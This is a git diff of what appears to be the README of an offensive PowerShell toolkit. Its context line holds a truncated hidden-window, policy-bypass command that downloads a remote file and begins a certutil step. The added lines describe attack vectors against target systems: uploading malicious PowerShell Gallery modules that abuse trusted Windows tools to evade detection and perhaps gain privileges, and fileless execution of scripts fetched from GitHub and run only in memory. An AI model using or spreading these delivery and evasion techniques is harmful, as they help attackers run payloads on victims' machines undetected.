@@ -33,4 +33,10 @@ powershell -NoP -W H -Ep Bypass irm LINK -O $env:USERPROFILE\e.txt;certutil -f -
 
 # Attack Vectors:
 
-- Upload PowerShell Gallery module and import it onto targets systems. This method allows widge range use as most Windows computers has PowerShell enabled. This method also exploits trusted Windows applications, making it harder to detect. This method could also potentially assist in elevated privileges.
+### PowerShell Gallery Modules
+
+- Upload PowerShell Gallery module and import it onto targets systems. This method allows widge range use as most Windows computers has PowerShell enabled. This method also exploits trusted Windows applications, making it harder to detect. This method could also potentially assist in elevated privileges. However, when a module is imported from PowerShell Gallery, it touches the hard drive and is typically saved to `"C:\Users\USER\Documents\PowerShell\Modules\"`.
+
+### Fileless PowerShell Script Execution:
+
+- You can upload a file to a remote server and fetch the raw contents of the script and save it as a PowerShell variable and then execute that variable. This allows the execution of PowerShell scripts without the script ever touching the hard drive. The script is saved as a variable, which is only stored in memory for that current session. Using GitHub to host the PowerShell script is a common tactic. 
